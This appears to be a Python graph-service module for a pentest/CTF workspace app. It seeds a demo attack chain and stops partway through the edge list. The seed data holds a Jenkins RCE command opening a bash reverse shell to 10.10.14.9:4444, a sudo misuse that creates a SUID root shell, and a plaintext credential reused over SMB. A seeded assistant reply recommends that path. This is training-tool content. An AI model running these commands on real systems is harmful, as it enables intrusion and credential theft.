from __future__ import annotations

import uuid
from collections import deque
from pathlib import Path

from sqlalchemy import func, select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.ai import AIChatMessage, AIConversation, AIMemory
from app.models.command_history import CommandHistory
from app.models.graph import (
    GraphEdgeDB,
    GraphNodeDB,
    GraphScenarioDB,
    GraphScenarioEdgeDB,
    GraphScenarioNodeDB,
)
from app.models.knowledge import KnowledgeDoc, KnowledgeSource
from app.models.project import Project
from app.models.terminal_session import TerminalSessionDB
from app.models.timeline import Timeline
from app.schemas.graph import (
    GraphBatchRequest,
    GraphBatchResponse,
    GraphEdge,
    GraphNode,
    GraphPath,
    GraphPathsResponse,
    GraphPosition,
    GraphResponse,
    GraphScenario,
)


def _position(x: float, y: float) -> dict[str, float]:
    return {"x": x, "y": y}


def _scoped_id(project_id: str, raw_id: str) -> str:
    return f"{project_id}-{raw_id}"


def _remap_meta(meta: dict, id_map: dict[str, str]) -> dict:
    remapped = dict(meta)
    for key in ("host_id", "affected_service_id", "location", "via_ref"):
        value = remapped.get(key)
        if isinstance(value, str) and value in id_map:
            remapped[key] = id_map[value]
    return remapped


class GraphService:
    def __init__(self, db: AsyncSession):
        self.db = db

    async def get_graph(self, project_id: str) -> GraphResponse:
        nodes = (
            await self.db.execute(
                select(GraphNodeDB)
                .where(
                    GraphNodeDB.project_id == project_id,
                    GraphNodeDB.is_deleted.is_(False),
                )
                .order_by(GraphNodeDB.sequence_index.asc(), GraphNodeDB.id.asc())
            )
        ).scalars().all()
        edges = (
            await self.db.execute(
                select(GraphEdgeDB)
                .where(GraphEdgeDB.project_id == project_id)
                .order_by(GraphEdgeDB.sequence_index.asc(), GraphEdgeDB.id.asc())
            )
        ).scalars().all()
        scenarios = (
            await self.db.execute(
                select(GraphScenarioDB)
                .where(GraphScenarioDB.project_id == project_id)
                .order_by(GraphScenarioDB.created_at.asc(), GraphScenarioDB.id.asc())
            )
        ).scalars().all()

        scenario_node_links = []
        scenario_edge_links = []
        if scenarios:
            scenario_ids = [scenario.id for scenario in scenarios]
            scenario_node_links = (
                await self.db.execute(
                    select(GraphScenarioNodeDB).where(
                        GraphScenarioNodeDB.scenario_id.in_(scenario_ids)
                    )
                )
            ).scalars().all()
            scenario_edge_links = (
                await self.db.execute(
                    select(GraphScenarioEdgeDB).where(
                        GraphScenarioEdgeDB.scenario_id.in_(scenario_ids)
                    )
                )
            ).scalars().all()

        scenario_node_ids: dict[str, list[str]] = {}
        for link in scenario_node_links:
            scenario_node_ids.setdefault(link.scenario_id, []).append(link.node_id)

        scenario_edge_ids: dict[str, list[str]] = {}
        for link in scenario_edge_links:
            scenario_edge_ids.setdefault(link.scenario_id, []).append(link.edge_id)

        api_nodes = [self._to_graph_node(node) for node in nodes]
        api_edges = [self._to_graph_edge(edge) for edge in edges]
        api_scenarios = [
            GraphScenario(
                id=scenario.id,
                project_id=scenario.project_id,
                name=scenario.name,
                description=scenario.description,
                color=scenario.color,
                is_active=scenario.is_active,
                node_ids=scenario_node_ids.get(scenario.id, []),
                edge_ids=scenario_edge_ids.get(scenario.id, []),
            )
            for scenario in scenarios
        ]
        active_scenario = next(
            (scenario.id for scenario in scenarios if scenario.is_active),
            None,
        )

        return GraphResponse(
            project_id=project_id,
            source="stored",
            nodes=api_nodes,
            edges=api_edges,
            scenarios=api_scenarios,
            active_scenario_id=active_scenario,
        )

    async def update_node_position(
        self, *, project_id: str, node_id: str, position: GraphPosition
    ) -> GraphNode:
        node = await self.db.scalar(
            select(GraphNodeDB).where(
                GraphNodeDB.id == node_id,
                GraphNodeDB.project_id == project_id,
                GraphNodeDB.is_deleted.is_(False),
            )
        )
        if not node:
            raise ValueError("Graph node not found")
        node.position_x = position.x
        node.position_y = position.y
        node.meta_json = {
            **dict(node.meta_json or {}),
            "position_pinned": True,
        }
        await self.db.commit()
        await self.db.refresh(node)
        return self._to_graph_node(node)

    async def create_batch(
        self, *, project_id: str, payload: GraphBatchRequest
    ) -> GraphBatchResponse:
        if not payload.nodes and not payload.edges:
            raise ValueError("Batch request must include at least one node or edge")

        created_node_ids: list[str] = []
        created_edge_ids: list[str] = []

        try:
            node_sequence_start = await self._next_sequence_index(GraphNodeDB, project_id)
            edge_sequence_start = await self._next_sequence_index(GraphEdgeDB, project_id)

            external_node_ids = {
                node_id
                for edge in payload.edges
                for node_id in (edge.source_id, edge.target_id)
                if node_id
            }
            existing_node_ids = await self._load_existing_node_ids(project_id, external_node_ids)
            missing_node_ids = external_node_ids - existing_node_ids
            if missing_node_ids:
                missing_node_id = sorted(missing_node_ids)[0]
                raise ValueError(f"Graph node not found: {missing_node_id}")

            ref_to_node_id: dict[str, str] = {}
            for index, node in enumerate(payload.nodes):
                node_id = str(uuid.uuid4())
                created_node_ids.append(node_id)
                ref_to_node_id[f"${index}"] = node_id
                source_step_ids = list(node.source_step_ids)
                if payload.source_step_id and payload.source_step_id not in source_step_ids:
                    source_step_ids.append(payload.source_step_id)
                self.db.add(
                    GraphNodeDB(
                        id=node_id,
                        project_id=project_id,
                        type=node.type,
                        label=node.label,
                        created_by=node.created_by,
                        confidence=node.confidence,
                        sequence_index=node_sequence_start + index,
                        source_step_ids=source_step_ids,
                        tags=node.tags,
                        notes=node.notes,
                        position_x=node.position.x if node.position else None,
                        position_y=node.position.y if node.position else None,
                        meta_json=node.meta,
                    )
                )

            await self.db.flush()

            for index, edge in enumerate(payload.edges):
                source_id = self._resolve_batch_node_reference(
                    raw_id=edge.source_id,
                    raw_ref=edge.source_ref,
                    ref_to_node_id=ref_to_node_id,
                    field_name="source",
                )
                target_id = self._resolve_batch_node_reference(
                    raw_id=edge.target_id,
                    raw_ref=edge.target_ref,
                    ref_to_node_id=ref_to_node_id,
                    field_name="target",
                )
                edge_id = str(uuid.uuid4())
                created_edge_ids.append(edge_id)
                self.db.add(
                    GraphEdgeDB(
                        id=edge_id,
                        project_id=project_id,
                        source_id=source_id,
                        target_id=target_id,
                        kind=edge.kind,
                        source_step_id=edge.source_step_id or payload.source_step_id,
                        command=edge.command,
                        tool=edge.tool,
                        confidence=edge.confidence,
                        sequence_index=edge_sequence_start + index,
                        label=edge.label,
                        meta_json=edge.meta,
                    )
                )

            await self.db.commit()
        except Exception:
            await self.db.rollback()
            raise

        return GraphBatchResponse(
            created_node_ids=created_node_ids,
            created_edge_ids=created_edge_ids,
        )

    async def seed_demo_ctf(self, project: Project, *, user_id: str) -> GraphResponse:
        existing_node = await self.db.scalar(
            select(GraphNodeDB.id)
            .where(
                GraphNodeDB.project_id == project.id,
                GraphNodeDB.is_deleted.is_(False),
            )
            .limit(1)
        )
        if existing_node:
            return await self.get_graph(project.id)

        command_ids = await self._seed_command_history(project, user_id=user_id)
        timeline_ids = await self._seed_timeline(project.id)
        ai_refs = await self._seed_ai_context(project.id, user_id=user_id)
        knowledge_ids = await self._seed_knowledge(project, user_id=user_id)
        refs = {**command_ids, **timeline_ids, **ai_refs, **knowledge_ids}

        nodes = self._build_demo_nodes(project.id, refs)
        edges = self._build_demo_edges(project.id, refs)
        scenarios = self._build_demo_scenarios(project.id, nodes, edges)
        self._scope_demo_graph(project.id, nodes, edges, scenarios)

        for fallback_sequence_index, node in enumerate(nodes, start=1):
            self.db.add(
                GraphNodeDB(
                    id=node["id"],
                    project_id=project.id,
                    type=node["type"],
                    label=node["label"],
                    created_by=node.get("created_by", "import"),
                    confidence=node.get("confidence", 1.0),
                    sequence_index=node.get("sequence_index", fallback_sequence_index),
                    source_step_ids=node.get("source_step_ids", []),
                    tags=node.get("tags", []),
                    notes=node.get("notes"),
                    position_x=node.get("position", {}).get("x"),
                    position_y=node.get("position", {}).get("y"),
                    meta_json=node.get("meta", {}),
                )
            )

        for fallback_sequence_index, edge in enumerate(edges, start=1):
            self.db.add(
                GraphEdgeDB(
                    id=edge["id"],
                    project_id=project.id,
                    source_id=edge["source_id"],
                    target_id=edge["target_id"],
                    kind=edge["kind"],
                    source_step_id=edge.get("source_step_id"),
                    command=edge.get("command"),
                    tool=edge.get("tool"),
                    confidence=edge.get("confidence", 1.0),
                    sequence_index=edge.get("sequence_index", fallback_sequence_index),
                    label=edge.get("label"),
                    meta_json=edge.get("meta", {}),
                )
            )

        for scenario in scenarios:
            self.db.add(
                GraphScenarioDB(
                    id=scenario["id"],
                    project_id=project.id,
                    name=scenario["name"],
                    description=scenario.get("description"),
                    color=scenario.get("color", "#38bdf8"),
                    is_active=scenario.get("is_active", False),
                )
            )
            for node_id in scenario.get("node_ids", []):
                self.db.add(
                    GraphScenarioNodeDB(scenario_id=scenario["id"], node_id=node_id)
                )
            for edge_id in scenario.get("edge_ids", []):
                self.db.add(
                    GraphScenarioEdgeDB(scenario_id=scenario["id"], edge_id=edge_id)
                )

        variables = dict(project.variables or {})
        variables["attack_graph_v2_seed"] = {
            "kind": "demo-ctf",
            "workspace_seeded": True,
        }
        project.variables = variables

        await self.db.commit()
        await self.db.refresh(project)
        return await self.get_graph(project.id)

    async def get_shortest_paths(
        self,
        *,
        project_id: str,
        from_id: str,
        to_id: str,
    ) -> GraphPathsResponse:
        graph = await self.get_graph(project_id)
        node_map = {node.id: node for node in graph.nodes}
        edge_map = {edge.id: edge for edge in graph.edges}
        outgoing: dict[str, list[GraphEdge]] = {}
        for edge in graph.edges:
            outgoing.setdefault(edge.source_id, []).append(edge)

        if from_id not in node_map or to_id not in node_map:
            return GraphPathsResponse(project_id=project_id, paths=[])

        queue: deque[str] = deque([from_id])
        previous: dict[str, tuple[str, str]] = {}
        visited = {from_id}

        while queue:
            current = queue.popleft()
            if current == to_id:
                break
            for edge in outgoing.get(current, []):
                if edge.target_id in visited:
                    continue
                visited.add(edge.target_id)
                previous[edge.target_id] = (current, edge.id)
                queue.append(edge.target_id)

        if to_id not in visited:
            return GraphPathsResponse(project_id=project_id, paths=[])

        node_ids = [to_id]
        edge_ids: list[str] = []
        cursor = to_id
        while cursor != from_id:
            previous_node, edge_id = previous[cursor]
            node_ids.append(previous_node)
            edge_ids.append(edge_id)
            cursor = previous_node

        node_ids.reverse()
        edge_ids.reverse()

        return GraphPathsResponse(
            project_id=project_id,
            paths=[
                GraphPath(
                    node_ids=node_ids,
                    edge_ids=edge_ids,
                    nodes=[node_map[node_id] for node_id in node_ids],
                    edges=[edge_map[edge_id] for edge_id in edge_ids],
                )
            ],
        )

    def _to_graph_node(self, node: GraphNodeDB) -> GraphNode:
        position = None
        if node.position_x is not None and node.position_y is not None:
            position = GraphPosition(x=node.position_x, y=node.position_y)
        return GraphNode(
            id=node.id,
            project_id=node.project_id,
            type=node.type,
            label=node.label,
            created_at=node.created_at,
            updated_at=node.updated_at,
            created_by=node.created_by,
            confidence=node.confidence,
            sequence_index=node.sequence_index,
            source_step_ids=list(node.source_step_ids or []),
            tags=list(node.tags or []),
            notes=node.notes,
            position=position,
            meta=dict(node.meta_json or {}),
        )

    def _to_graph_edge(self, edge: GraphEdgeDB) -> GraphEdge:
        return GraphEdge(
            id=edge.id,
            project_id=edge.project_id,
            source_id=edge.source_id,
            target_id=edge.target_id,
            kind=edge.kind,
            source_step_id=edge.source_step_id,
            command=edge.command,
            tool=edge.tool,
            created_at=edge.created_at,
            confidence=edge.confidence,
            sequence_index=edge.sequence_index,
            label=edge.label,
            meta=dict(edge.meta_json or {}),
        )

    async def _next_sequence_index(self, model, project_id: str) -> int:
        result = await self.db.scalar(
            select(func.coalesce(func.max(model.sequence_index), 0)).where(
                model.project_id == project_id
            )
        )
        return int(result or 0) + 1

    async def _load_existing_node_ids(
        self, project_id: str, node_ids: set[str]
    ) -> set[str]:
        if not node_ids:
            return set()
        result = await self.db.execute(
            select(GraphNodeDB.id).where(
                GraphNodeDB.project_id == project_id,
                GraphNodeDB.is_deleted.is_(False),
                GraphNodeDB.id.in_(node_ids),
            )
        )
        return set(result.scalars().all())

    def _resolve_batch_node_reference(
        self,
        *,
        raw_id: str | None,
        raw_ref: str | None,
        ref_to_node_id: dict[str, str],
        field_name: str,
    ) -> str:
        if raw_ref:
            resolved = ref_to_node_id.get(raw_ref)
            if not resolved:
                raise ValueError(f"Invalid {field_name}_ref: {raw_ref}")
            return resolved
        if raw_id:
            return raw_id
        raise ValueError(f"Batch edge requires {field_name}_id or {field_name}_ref")

    async def _seed_command_history(self, project: Project, *, user_id: str) -> dict[str, str]:
        session = TerminalSessionDB(
            id=f"graph-seed-{uuid.uuid4().hex[:8]}",
            project_id=project.id,
            name="Demo CTF",
            master_token=f"master-{uuid.uuid4().hex}",
            viewer_token=f"viewer-{uuid.uuid4().hex}",
            is_alive=False,
        )
        self.db.add(session)
        await self.db.flush()

        commands: list[tuple[str, str, str, int]] = [
            (
                "cmd-nmap",
                "nmap -sV -Pn 10.10.110.10 10.10.110.20",
                "WEB01: 22/ssh, 80/http, 8080/jenkins. FILE01: 445/smb.",
                0,
            ),
            (
                "cmd-ffuf",
                "ffuf -u http://10.10.110.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0",
                "/jenkins, /backup, /assets discovered on WEB01.",
                0,
            ),
            (
                "cmd-jenkins-rce",
                "python3 jenkins_console_rce.py --url http://10.10.110.10:8080 --cmd \"bash -c 'bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'\"",
                "Reverse shell returned as www-data on WEB01.",
                0,
            ),
            (
                "cmd-sudo-l",
                "sudo -l",
                "jenkins may run /usr/local/bin/backup-runner as root without password.",
                0,
            ),
            (
                "cmd-root-privesc",
                "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/backup.sh && sudo /usr/local/bin/backup-runner /tmp/backup.sh",
                "backup-runner executed payload as root. SUID shell ready.",
                0,
            ),
            (
                "cmd-user-flag",
                "cat /home/jenkins/user.txt",
                "3e7c2b7b8b2d-user-flag",
                0,
            ),
            (
                "cmd-root-flag",
                "cat /root/root.txt",
                "8b6bc4f0947d-root-flag",
                0,
            ),
            (
                "cmd-svc-cred",
                "cat /root/notes/svc_backup.txt",
                "svc_backup:Winter2026!backup",
                0,
            ),
            (
                "cmd-netexec",
                "netexec smb 10.10.110.20 -u svc_backup -p 'Winter2026!backup' --shares",
                "FILE01 shares: forensic, backups, IPC$",
                0,
            ),
            (
                "cmd-smbclient",
                "smbclient //10.10.110.20/forensic -U 'svc_backup%Winter2026!backup' -c 'ls'",
                "loot.zip, triage.txt, memory.raw",
                0,
            ),
        ]

        ids: dict[str, str] = {}
        for key, command, output, exit_code in commands:
            entry = CommandHistory(
                project_id=project.id,
                session_id=session.id,
                command=command,
                output=output,
                output_preview=output[:200],
                exit_code=exit_code,
                cwd=project.workspace_path,
                duration_ms=180,
                executed_by=user_id,
                source="user",
            )
            self.db.add(entry)
            await self.db.flush()
            ids[key] = entry.id
        return ids

    async def _seed_timeline(self, project_id: str) -> dict[str, str]:
        entries = [
            (
                "timeline-jenkins",
                "finding",
                "Jenkins script console exposed on WEB01",
                "Anonymous read plus admin console execution path confirmed.",
            ),
            (
                "timeline-backup",
                "note",
                "backup-runner executes operator supplied script as root",
                "Privilege escalation path is deterministic after foothold.",
            ),
            (
                "timeline-svc",
                "credential",
                "Recovered svc_backup credential from /root/notes",
                "Credential likely re-usable on FILE01 over SMB.",
            ),
            (
                "timeline-forensic",
                "loot",
                "Collected FILE01 forensic archive",
                "loot.zip contains responder captures and triage material.",
            ),
        ]

        ids: dict[str, str] = {}
        for key, entry_type, content, output in entries:
            entry = Timeline(
                project_id=project_id,
                type=entry_type,
                content=content,
                output=output,
                entry_data={},
            )
            self.db.add(entry)
            await self.db.flush()
            ids[key] = entry.id
        return ids

    async def _seed_ai_context(self, project_id: str, *, user_id: str) -> dict[str, str]:
        conversation = AIConversation(
            user_id=user_id,
            project_id=project_id,
            title="ACME Jenkins foothold review",
        )
        self.db.add(conversation)
        await self.db.flush()

        user_message = AIChatMessage(
            conversation_id=conversation.id,
            role="user",
            content=(
                "We have Jenkins console access on WEB01. What is the shortest path "
                "to root and what pivot is worth trying after that?"
            ),
        )
        assistant_message = AIChatMessage(
            conversation_id=conversation.id,
            role="assistant",
            content=(
                "Abuse backup-runner for root, recover svc_backup from /root/notes, "
                "then reuse it against FILE01 SMB shares."
            ),
        )
        memory = AIMemory(
            user_id=user_id,
            project_id=project_id,
            key="post_root_pivot",
            value="svc_backup works on FILE01 SMB after root compromise on WEB01",
        )
        self.db.add(user_message)
        self.db.add(assistant_message)
        self.db.add(memory)
        await self.db.flush()

        return {
            "ai-user-message": user_message.id,
            "ai-assistant-message": assistant_message.id,
            "ai-memory": memory.id,
        }

    async def _seed_knowledge(self, project: Project, *, user_id: str) -> dict[str, str]:
        source_dir = Path(project.workspace_path) / "knowledge" / "ctf-demo"
        source_dir.mkdir(parents=True, exist_ok=True)

        source = KnowledgeSource(
            name="CTF Demo Notes",
            source_type="local",
            path=str(source_dir),
            user_id=user_id,
            project_id=project.id,
            read_only=False,
            sync_status="ready",
        )
        self.db.add(source)
        await self.db.flush()

        docs = [
            (
                "kb-jenkins",
                "Jenkins script console RCE",
                "web/jenkins-script-console-rce.md",
                "# Jenkins RCE\n\nExploit the script console to land a shell as www-data.\n",
                "jenkins rce mitre:T1059",
            ),
            (
                "kb-backup",
                "backup-runner privesc",
                "linux/backup-runner-privesc.md",
                "# backup-runner\n\nOperator supplied scripts execute as root.\n",
                "linux privesc sudo mitre:T1548",
            ),
            (
                "kb-smb",
                "FILE01 SMB follow-up",
                "windows/file01-smb-followup.md",
                "# FILE01 SMB\n\nUse svc_backup against forensic and backups shares.\n",
                "smb lateral mitre:T1021",
            ),
        ]

        ids: dict[str, str] = {}
        for key, title, relative_path, body, tags in docs:
            file_path = source_dir / relative_path
            file_path.parent.mkdir(parents=True, exist_ok=True)
            file_path.write_text(body, encoding="utf-8")
            doc = KnowledgeDoc(
                source_id=source.id,
                title=title,
                relative_path=relative_path,
                body=body,
                tags=tags,
            )
            self.db.add(doc)
            await self.db.flush()
            ids[key] = doc.id
        return ids

    def _build_demo_nodes(self, project_id: str, refs: dict[str, str]) -> list[dict]:
        return [
            {
                "id": "action-nmap",
                "project_id": project_id,
                "type": "action",
                "label": "nmap -sV -Pn 10.10.110.10 10.10.110.20",
                "created_by": "import",
                "source_step_ids": [refs["cmd-nmap"]],
                "tags": ["recon", "nmap"],
                "position": _position(-280, -40),
                "meta": {
                    "tool": "nmap",
                    "phase": "recon",
                    "command": "nmap -sV -Pn 10.10.110.10 10.10.110.20",
                    "stdout": "WEB01 and FILE01 services enumerated.",
                },
            },
            {
                "id": "host-web01",
                "project_id": project_id,
                "type": "host",
                "label": "WEB01",
                "created_by": "import",
                "source_step_ids": [refs["cmd-nmap"]],
                "tags": ["linux", "compromised"],
                "notes": "Ubuntu application host with exposed Jenkins.",
                "position": _position(-20, 40),
                "meta": {
                    "ip": "10.10.110.10",
                    "hostname": "web01.acme.local",
                    "os": "Ubuntu 22.04",
                    "ports_open": [22, 80, 8080],
                    "is_compromised": True,
                },
            },
            {
                "id": "host-file01",
                "project_id": project_id,
                "type": "host",
                "label": "FILE01",
                "created_by": "import",
                "source_step_ids": [refs["cmd-nmap"], refs["cmd-netexec"]],
                "tags": ["windows", "pivot"],
                "position": _position(1000, 40),
                "meta": {
                    "ip": "10.10.110.20",
                    "hostname": "file01.acme.local",
                    "os": "Windows Server 2019",
                    "ports_open": [445],
                    "is_compromised": False,
                },
            },
            {
                "id": "service-http",
                "project_id": project_id,
                "type": "service",
                "label": "HTTP :80",
                "created_by": "import",
                "source_step_ids": [refs["cmd-nmap"]],
                "tags": ["web"],
                "position": _position(180, -80),
                "meta": {
                    "host_id": "host-web01",
                    "port": 80,
                    "protocol": "tcp",
                    "service_name": "http",
                    "product": "nginx",
                },
            },
            {
                "id": "service-jenkins",
                "project_id": project_id,
                "type": "service",
                "label": "Jenkins :8080",
                "created_by": "import",
                "source_step_ids": [refs["cmd-nmap"], refs["cmd-ffuf"]],
                "tags": ["web", "jenkins"],
                "position": _position(180, 20),
                "meta": {
                    "host_id": "host-web01",
                    "port": 8080,
                    "protocol": "tcp",
                    "service_name": "jenkins",
                    "product": "Jenkins",
                    "version": "2.440",
                },
            },
            {
                "id": "service-smb",
                "project_id": project_id,
                "type": "service",
                "label": "SMB :445",
                "created_by": "import",
                "source_step_ids": [refs["cmd-nmap"], refs["cmd-netexec"]],
                "tags": ["smb"],
                "position": _position(760, 20),
                "meta": {
                    "host_id": "host-file01",
                    "port": 445,
                    "protocol": "tcp",
                    "service_name": "microsoft-ds",
                    "product": "SMB",
                },
            },
            {
                "id": "finding-jenkins",
                "project_id": project_id,
                "type": "finding",
                "label": "Exposed Jenkins Script Console",
                "created_by": "import",
                "source_step_ids": [refs["timeline-jenkins"], refs["cmd-ffuf"]],
                "tags": ["high", "web"],
                "position": _position(410, -70),
                "meta": {
                    "severity": "high",
                    "title": "Exposed Jenkins Script Console",
                    "description": "Anonymous read plus admin console execution path confirmed.",
                },
            },
            {
                "id": "finding-backup",
                "project_id": project_id,
                "type": "finding",
                "label": "backup-runner sudo misconfiguration",
                "created_by": "import",
                "source_step_ids": [refs["timeline-backup"], refs["cmd-sudo-l"]],
                "tags": ["critical", "privesc"],
                "position": _position(650, 200),
                "meta": {
                    "severity": "critical",
                    "title": "backup-runner sudo misconfiguration",
                    "description": "Operator supplied scripts execute as root without password.",
                },
            },
            {
                "id": "action-jenkins-rce",
                "project_id": project_id,
                "type": "action",
                "label": "Jenkins console RCE",
                "created_by": "import",
                "source_step_ids": [
                    refs["cmd-jenkins-rce"],
                    refs["timeline-jenkins"],
                    refs["kb-jenkins"],
                ],
                "tags": ["exploit", "jenkins"],
                "position": _position(430, 40),
                "meta": {
                    "tool": "python3",
                    "phase": "exploit",
                    "command": "python3 jenkins_console_rce.py ...",
                    "stdout": "Reverse shell returned as www-data on WEB01.",
                },
            },
            {
                "id": "artifact-jenkins-poc",
                "project_id": project_id,
                "type": "artifact",
                "label": "jenkins_console_rce.py",
                "created_by": "import",
                "source_step_ids": [refs["cmd-jenkins-rce"]],
                "tags": ["artifact", "exploit"],
                "position": _position(170, 180),
                "meta": {
                    "kind": "script",
                    "path": "workspace/exploits/jenkins_console_rce.py",
                    "description": "Proof-of-concept used for initial foothold.",
                },
            },
            {
                "id": "session-www",
                "project_id": project_id,
                "type": "session",
                "label": "www-data@WEB01",
                "created_by": "import",
                "source_step_ids": [refs["cmd-jenkins-rce"]],
                "tags": ["foothold", "linux"],
                "position": _position(690, 40),
                "meta": {
                    "host_id": "host-web01",
                    "user": "www-data",
                    "privilege": "user",
                    "shell_type": "bash",
                    "is_active": False,
                },
            },
            {
                "id": "action-root-privesc",
                "project_id": project_id,
                "type": "action",
                "label": "Abuse backup-runner for root",
                "created_by": "import",
                "source_step_ids": [
                    refs["cmd-root-privesc"],
                    refs["kb-backup"],
                    refs["ai-assistant-message"],
                ],
                "tags": ["privesc"],
                "position": _position(930, 180),
                "meta": {
                    "tool": "sudo",
                    "phase": "privesc",
                    "command": "sudo /usr/local/bin/backup-runner /tmp/backup.sh",
                    "stdout": "SUID shell prepared for root.",
                },
            },
            {
                "id": "session-root",
                "project_id": project_id,
                "type": "session",
                "label": "root@WEB01",
                "created_by": "import",
                "source_step_ids": [refs["cmd-root-privesc"]],
                "tags": ["root", "linux"],
                "position": _position(1170, 180),
                "meta": {
                    "host_id": "host-web01",
                    "user": "root",
                    "privilege": "root",
                    "shell_type": "bash",
                    "is_active": True,
                },
            },
            {
                "id": "loot-user-flag",
                "project_id": project_id,
                "type": "loot",
                "label": "user.txt",
                "created_by": "import",
                "source_step_ids": [refs["cmd-user-flag"]],
                "tags": ["flag"],
                "position": _position(940, -40),
                "meta": {
                    "kind": "flag",
                    "value_masked": "3e7c********",
                    "location": "host-web01",
                },
            },
            {
                "id": "action-root-flag",
                "project_id": project_id,
                "type": "action",
                "label": "Read root.txt",
                "created_by": "import",
                "source_step_ids": [refs["cmd-root-flag"]],
                "tags": ["post", "loot"],
                "position": _position(1370, 100),
                "meta": {
                    "tool": "cat",
                    "phase": "post",
                    "command": "cat /root/root.txt",
                    "stdout": "8b6bc4f0947d-root-flag",
                },
            },
            {
                "id": "loot-root-flag",
                "project_id": project_id,
                "type": "loot",
                "label": "root.txt",
                "created_by": "import",
                "source_step_ids": [refs["cmd-root-flag"]],
                "tags": ["flag", "root"],
                "position": _position(1620, 100),
                "meta": {
                    "kind": "flag",
                    "value_masked": "8b6b********",
                    "location": "host-web01",
                },
            },
            {
                "id": "action-svc-cred",
                "project_id": project_id,
                "type": "action",
                "label": "Recover svc_backup credential",
                "created_by": "import",
                "source_step_ids": [
                    refs["cmd-svc-cred"],
                    refs["timeline-svc"],
                    refs["ai-memory"],
                ],
                "tags": ["credential", "post"],
                "position": _position(1370, 250),
                "meta": {
                    "tool": "cat",
                    "phase": "post",
                    "command": "cat /root/notes/svc_backup.txt",
                    "stdout": "svc_backup:Winter2026!backup",
                },
            },
            {
                "id": "credential-svc-backup",
                "project_id": project_id,
                "type": "credential",
                "label": "svc_backup",
                "created_by": "import",
                "source_step_ids": [refs["cmd-svc-cred"], refs["timeline-svc"]],
                "tags": ["credential", "pivot"],
                "position": _position(1620, 250),
                "meta": {
                    "username": "svc_backup",
                    "password_masked": "Winter2026!backup",
                    "domain": "ACME",
                    "source_type": "dump",
                },
            },
            {
                "id": "user-svc-backup",
                "project_id": project_id,
                "type": "user",
                "label": "ACME\\svc_backup",
                "created_by": "import",
                "source_step_ids": [refs["cmd-svc-cred"]],
                "tags": ["ad", "user"],
                "position": _position(1860, 250),
                "meta": {
                    "username": "svc_backup",
                    "domain": "ACME",
                    "group": "Backup Operators",
                    "is_domain_admin": False,
                },
            },
            {
                "id": "action-netexec",
                "project_id": project_id,
                "type": "action",
                "label": "Validate SMB access on FILE01",
                "created_by": "import",
                "source_step_ids": [
                    refs["cmd-netexec"],
                    refs["kb-smb"],
                    refs["ai-assistant-message"],
                ],
                "tags": ["pivot", "smb"],
                "position": _position(1860, 20),
                "meta": {
                    "tool": "netexec",
                    "phase": "post",
                    "command": "netexec smb 10.10.110.20 -u svc_backup -p 'Winter2026!backup' --shares",
                    "stdout": "forensic and backups shares accessible on FILE01.",
                },
            },
            {
                "id": "session-smb-file01",
                "project_id": project_id,
                "type": "session",
                "label": "svc_backup@FILE01",
                "created_by": "import",
                "source_step_ids": [refs["cmd-netexec"], refs["cmd-smbclient"]],
                "tags": ["pivot", "smb"],
                "position": _position(2120, 20),
                "meta": {
                    "host_id": "host-file01",
                    "user": "svc_backup",
                    "privilege": "user",
                    "shell_type": "smb",
                    "is_active": False,
                },
            },
            {
                "id": "action-smbclient",
                "project_id": project_id,
                "type": "action",
                "label": "Pull forensic share",
                "created_by": "import",
                "source_step_ids": [refs["cmd-smbclient"], refs["timeline-forensic"]],
                "tags": ["loot", "smb"],
                "position": _position(2360, 20),
                "meta": {
                    "tool": "smbclient",
                    "phase": "post",
                    "command": "smbclient //10.10.110.20/forensic ...",
                    "stdout": "loot.zip, triage.txt, memory.raw",
                },
            },
            {
                "id": "loot-forensic",
                "project_id": project_id,
                "type": "loot",
                "label": "loot.zip",
                "created_by": "import",
                "source_step_ids": [refs["cmd-smbclient"], refs["timeline-forensic"]],
                "tags": ["archive", "pivot"],
                "position": _position(2600, 20),
                "meta": {
                    "kind": "file",
                    "value_masked": "loot.zip",
                    "location": "host-file01",
                },
            },
        ]

    def _build_demo_edges(self, project_id: str, refs: dict[str, str]) -> list[dict]:
        return [
            {
                "id": "edge-http-runs-on-web01",
                "project_id": project_id,
                "source_id": "service-http",
                "target_id": "host-web01",
                "kind": "runs_on",
                "source_step_id": refs["cmd-nmap"],
                "tool": "nmap",
            },
            {
                "id": "edge-jenkins-runs-on-web01",
                "project_id": project_id,
                "source_id": "service-jenkins",
                "target_id": "host-web01",
                "kind": "runs_on",
                "source_step_id": refs["cmd-nmap"],
                "tool": "nmap",
            },
            {
                "id": "edge-smb-runs-on-file01",
                "project_id": project_id,
                "source_id": "service-smb",
                "target_id": "host-file01",
                "kind": "runs_on",
                "source_step_id": refs["cmd-nmap"],
                "tool": "nmap",
            },
            {
                "id": "edge-web01-discovered-by-nmap",
                "project_id": project_id,
                "source_id": "host-web01",
                "target_id": "action-nmap",
                "kind": "discovered_by",
                "source_step_id": refs["cmd-nmap"],
                "tool": "nmap",
            },
            {
                "id": "edge-file01-discovered-by-nmap",
                "project_id": project_id,
                "source_id": "host-file01",
                "target_id": "action-nmap",
                "kind": "discovered_by",
                "source_step_id": refs["cmd-nmap"],
                "tool": "nmap",
            },
            {
                "id": "edge-jenkins-service-finding",
                "project_id": project_id,
                "source_id": "service-jenkins",
                "target_id": "finding-jenkins",
                "kind": "exploited_via",
                "source_step_id": refs["cmd-ffuf"],
            },
            {
                "id": "edge-jenkins-finding-to-action",
                "project_id": project_id,
                "source_id": "finding-jenkins",
                "target_id": "action-jenkins-rce",
                "kind": "related_to",
                "source_step_id": refs["cmd-jenkins-rce"],
            },
            {
                "id": "edge-artifact-to-action",
                "project_id": project_id,
                "source_id": "artifact-jenkins-poc",
                "target_id": "action-jenkins-rce",
                "kind": "related_to",
                "source_step_id": refs["cmd-jenkins-rce"],
            },
            {
                "id": "edge-rce-obtains-www-session",
                "project_id": project_id,
                "source_id": "action-jenkins-rce",
                "target_id": "session-www",
                "kind": "obtained",
                "source_step_id": refs["cmd-jenkins-rce"],
            },
            {
                "id": "edge-backup-finding-related-action",
                "project_id": project_id,
                "source_id": "finding-backup",
                "target_id": "action-root-privesc",
                "kind": "related_to",
                "source_step_id": refs["cmd-root-privesc"],
            },
            {
                "id": "edge-www-to-root",
                "project_id": project_id,
                "source_id": "session-www",
                "target_id": "session-root",
                "kind": "escalated_to",
                "source_step_id": refs["cmd-root-privesc"],
            },
